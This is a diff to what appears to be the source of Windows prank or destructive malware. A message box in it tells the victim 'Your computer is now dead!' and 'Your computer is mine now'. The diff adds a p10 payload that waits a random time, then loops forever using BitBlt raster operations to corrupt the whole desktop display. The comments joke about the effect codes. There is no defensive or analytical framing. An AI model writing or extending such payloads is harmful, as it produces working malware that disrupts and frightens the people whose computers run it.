@@ -1,5 +1,6 @@
 #pragma once
 #include <mmeapi.h>
+#include <wingdi.h>
 #define fori(x) for (INT i = 0; i < x; i++)
 #define whiletrue while (true)
 
@@ -16,7 +17,7 @@ int p1()
     msg2.cbSize = sizeof(MSGBOXPARAMS);
     msg2.hwndOwner = NULL;
     msg2.hInstance = GetModuleHandle(NULL);
-    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
+    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA.";
     msg2.lpszCaption = "Your computer is mine now";
     msg2.dwStyle = MB_OK | MB_ICONHAND;
     HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);
@@ -228,4 +229,24 @@ int p9()
     }
     CloseHandle(hDevice);
     return 0;
+}
+
+int p10() {
+    Sleep(rand() % 10000);
+    HDC desk = GetDC(NULL);
+    while (true) {
+        for (int i = 0; i < 500; i++) {
+            //0x32526961 is pogChamp
+            //42069420 (NO 0x I MAKE MY OWN RULES) is pog
+            //0x69696969
+            //0x3167000 is insnae
+            //0x8107520 is wOw
+            BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, 0x3167000);
+            // BitBlt(desk, 0, 0, 1920, 1080, desk, 0, 0, 0x69696969);
+        }
+        /*for (int i = 0; i < 6942; i++) {
+            BitBlt(desk, 0, 0, 1920, 1080, desk, -i, 0, SRCCOPY);
+        } */
+        Sleep(1000);
+    }
 }
